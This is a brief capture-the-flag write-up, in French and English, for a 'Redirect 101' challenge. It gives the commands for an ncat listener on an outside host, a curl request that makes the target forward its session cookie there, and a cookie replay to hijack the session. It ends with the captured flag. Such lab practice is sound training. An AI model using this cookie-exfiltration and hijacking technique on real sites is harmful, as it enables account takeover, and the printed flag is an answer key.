# Redirect 101
Used a previous writeup from a previous year xD (credz to Marco l'Pogo)

### terminal 1
``ssh root@shell.ctf``

### installer ncat parce que nc écoute pas sur ipv6
### install ncat cuz nc doesnt listen on ipv6
``apt install ncat``   
``ncat -lv 12345``

### terminal 2
``curl -G chal5.hackademy.ctf/pentester.php --data-urlencode "url=http://shell.ctf:12345"``

### noter le PHPSESSIONID affiché dans le terminal 1
### write the PHPSESSIONID shown in terminal 1

``curl chal5.hackademy.ctf -b "PHPSESSID=o136t04b24elhtdqgf9pit5fn4"``

``FLAG-mTKmrCUzf82LPdmK7x8yxpcAlo0R3hsF``
